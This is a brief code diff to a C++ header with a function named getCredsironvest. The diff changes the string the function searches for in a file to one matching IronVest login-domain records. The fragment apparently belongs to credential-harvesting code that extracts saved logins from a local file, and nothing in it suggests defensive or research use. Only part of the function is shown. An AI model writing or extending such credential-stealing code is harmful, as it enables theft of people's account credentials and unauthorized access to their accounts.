@@ -1,5 +1,4 @@
 #pragma once
-#pragma once
 #include <iostream>
 #include <fstream>
 #include <string>
@@ -14,7 +13,8 @@ int getCredsironvest() {
         return 1;
     }
 
-    std::string searchKeyword = "{\"eventName\":\"response:logins:domain:";
+    //std::string searchKeyword = "{\"eventName\":\"response:logins:domain:";
+    std::string searchKeyword = "\"domain\":\"ironvest.com\"";
     std::string foundData;
 
     while (!file.eof()) {
